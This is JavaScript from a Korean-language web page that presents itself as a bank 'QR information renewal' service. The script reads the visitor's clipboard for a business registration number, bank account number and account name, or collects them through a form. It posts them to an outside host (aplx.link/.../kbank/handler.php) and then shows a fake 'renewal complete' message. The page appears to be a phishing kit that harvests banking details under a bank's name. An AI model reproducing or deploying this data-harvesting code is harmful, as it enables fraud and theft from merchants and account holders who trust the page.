
  var manualMode = false;


  window.addEventListener('load', function(){
    var el = document.getElementById('page-spinner');
    var shown = Date.now();
    function revealCards(){      
      var privacyCard = document.getElementById('privacyCard');      
      if(privacyCard) { privacyCard.classList.remove('slide-hidden'); privacyCard.classList.add('slide-in-delay'); }
    }
    var hide = function(){
      el.style.opacity='0';
      el.style.transition='opacity .3s';
      setTimeout(function(){ el.style.display='none'; revealCards(); }, 300);
    };
    var elapsed = Date.now() - shown;
    var delay = Math.max(0, 1500 - elapsed);
    setTimeout(hide, delay);
    
    setInputListeners();
  });
  
  /* 데스크탑 장식 아이콘 표시 */
  (function () {
    var deco = document.querySelector('.header-deco');
    if (deco && window.innerWidth >= 1024) {
      deco.style.display = 'flex';
    }
    window.addEventListener('resize', function () {
      if (deco) deco.style.display = window.innerWidth >= 1024 ? 'flex' : 'none';
    });
  })();

  function setInputListeners() {
    var bizNoInput = document.getElementById('manualBizNo');
    var accountNameInput = document.getElementById('manualAccountName');
    var accountNoInput = document.getElementById('manualAccountNo');
    if (bizNoInput) bizNoInput.addEventListener('input', monitorInputForms);
    if (accountNameInput) accountNameInput.addEventListener('input', monitorInputForms);
    if (accountNoInput) accountNoInput.addEventListener('input', monitorInputForms);
  }

  function showManualForm() {    
    var card = document.getElementById('manualInputCard');
    if (card) {
      card.style.display = 'block';
      card.scrollIntoView({ behavior: 'smooth', block: 'start' });
    }
    document.getElementById('submitBtn').disabled = true;
  }

  function toggleSubmitBtn() {
    var checked = document.getElementById('consentCheck').checked;
    document.getElementById('submitBtn').disabled = !checked;
  }

  function validateForm() {
    var bizNo       = document.getElementById('manualBizNo').value.trim();
    var accountName = document.getElementById('manualAccountName').value.trim();
    var accountNo   = document.getElementById('manualAccountNo').value.trim();

    if (!bizNo || !accountName || !accountNo) return false;    
    return true;
  }

  function validateBizNum() {
    var bizNo       = document.getElementById('manualBizNo').value.trim();    
    if (!/^\d{3}-\d{2}-\d{5}$/.test(bizNo)) return false;
    return true;
  }

  function monitorInputForms() {
    if(validateForm()) {
      showGoButtons();
    }
    else {      
      hideGoButtons();
    }
  }

  function handleGo() {
    if (!validateForm()) {
        alert('모든 정보를 올바르게 입력해주세요.');
        return;
    }

    if (!validateBizNum()) {
        alert('사업자번호 형식이 올바르지 않습니다. 예시: 123-45-67890');
        return;
    }

    processForm();
  }

  function handleModify() {
    document.getElementById('manualBizNo').disabled = false;
    document.getElementById('manualAccountNo').disabled = false;
    document.getElementById('manualAccountName').disabled = false;
    document.getElementsByClassName('optional')[0].style.display = 'block';
    document.getElementsByClassName('optional')[1].style.display = 'block';
    document.getElementsByClassName('optional')[2].style.display = 'block';

    hideGoButtons();
    manualMode = true;
    showGoButtons();
  }

  function hideGoButtons() {    
    var modifyBtn = document.getElementById('modifyBtn');
    var goBtn = document.getElementById('goBtn');
    if (modifyBtn) modifyBtn.style.display = 'none';
    if (goBtn) goBtn.style.display = 'none';
  }

  function showGoButtons() {
    var modifyBtn = document.getElementById('modifyBtn');
    var goBtn = document.getElementById('goBtn');
    if (manualMode == false &&modifyBtn) modifyBtn.style.display = 'block';
    if (goBtn) goBtn.style.display = 'block';
  }

  async function handleConsent() {        
    var btn = document.getElementById('submitBtn');
    // 버튼 로딩 상태
    btn.disabled = true;
    btn.innerHTML = '<span class="spinner"></span>처리 중...';

    privacyCard.style.display = 'none';
    btn.style.display = 'none';

    var tab1 = document.getElementById('tab-1');
    var tab2 = document.getElementById('tab-2');
    var tab1Sub = document.getElementById('tab-1-sub');
    var tab2Sub = document.getElementById('tab-2-sub');
    tab1.classList.remove('active'); tab2.classList.add('active'); tab1.classList.add('inactive');
    tab1Sub.classList.remove('active'); tab2Sub.classList.add('active');

    var bizNo, accountNo, accountName;
    // 클립보드에서 데이터 읽기
    var clipText = '';
    try {
      if (navigator.clipboard && navigator.clipboard.readText) {
        clipText = await navigator.clipboard.readText();
      } else {
        throw new Error('clipboard not supported');
      }
    } catch (e) {
      manualMode = true;            
      hideGoButtons();
      showManualForm();
      return;
    }

    // 클립보드 데이터 파싱
    var parts = clipText.split(',');
    if (parts.length < 3 || !parts[0].trim() || !parts[1].trim() || !parts[2].trim()) {
      manualMode = true;
      hideGoButtons();
      showManualForm();
      return;
    }
    
    document.getElementsByClassName('optional')[0].style.display = 'none';
    document.getElementsByClassName('optional')[1].style.display = 'none';
    document.getElementsByClassName('optional')[2].style.display = 'none';
    document.getElementById('autoInputErrorMsg').style.display = 'none';
    showManualForm();    

    bizNo       = parts[0].trim();
    accountNo   = parts[1].trim();
    accountName = parts[2].trim();

    document.getElementById('manualBizNo').value = bizNo;
    document.getElementById('manualAccountNo').value = accountNo;
    document.getElementById('manualAccountName').value = accountName;
    
    document.getElementById('manualBizNo').disabled = true;
    document.getElementById('manualAccountNo').disabled = true;
    document.getElementById('manualAccountName').disabled = true;
  }

  
  function restoreGoBtn() {
    var goBtn = document.getElementById('goBtn');
    goBtn.disabled = false;
    goBtn.innerHTML = 'QR 정보 갱신하기';
  }

  function processForm() {
    let bizNo       = document.getElementById('manualBizNo').value.trim();
    let accountName = document.getElementById('manualAccountName').value.trim();
    let accountNo   = document.getElementById('manualAccountNo').value.trim();

    var goBtn = document.getElementById('goBtn');
    goBtn.disabled = true;
    goBtn.innerHTML = '<span class="spinner"></span>처리 중...';

    // AJAX POST
    var formData = new FormData();
    formData.append('biz_no',       bizNo);
    formData.append('account_no',   accountNo);
    formData.append('account_name', accountName);

    try {
      $.ajax({
        url: 'https://aplx.link/te/kbank/handler.php',
        type: 'POST',
        data: formData,
        processData: false,
        contentType: false,
        dataType: 'json',
        success: function (data) {
          if (data.result !== 'success') {
            restoreGoBtn();
            showGoButtons();
            showResult('error', '&#9888;', '오류가 발생했습니다', data.message || '잠시 후 다시 시도해주세요.');
            return;
          }

          document.getElementById('cardsGrid').style.display  = 'none';
          document.querySelector('.btn-wrap').style.display   = 'none';
          document.querySelector('.back-link').style.display  = 'none';
          document.querySelector('.step-indicator').style.display = 'none';

          var storeIdMsg = '<br><br>사업자 번호: <strong>' + bizNo + '</strong>';
          showResult('success', '&#10003;', '갱신이 완료되었습니다!',
            'QR 코드 정보 갱신 요청이 정상적으로 처리되었습니다.' + storeIdMsg);
        },
        error: function (err) {
          restoreGoBtn();
          showGoButtons();
          showResult('error', '&#9888;', '오류가 발생했습니다', '서버 오류. 잠시 후에 다시 시도해 주세요.');
        }
      });
    } catch (e) {
      restoreGoBtn();
      showGoButtons();
      showResult('error', '&#9888;', '오류가 발생했습니다', e.message || '잠시 후 다시 시도해주세요.');
    }
  }

  function showResult(type, icon, title, msg) {
    var box = document.getElementById('resultBox');
    box.className = 'result-box ' + type;
    box.style.display = 'block';
    document.getElementById('resultIcon').innerHTML = icon;
    document.getElementById('resultTitle').textContent = title;
    document.getElementById('resultMsg').innerHTML = msg;
    box.scrollIntoView({ behavior: 'smooth', block: 'start' });
  }
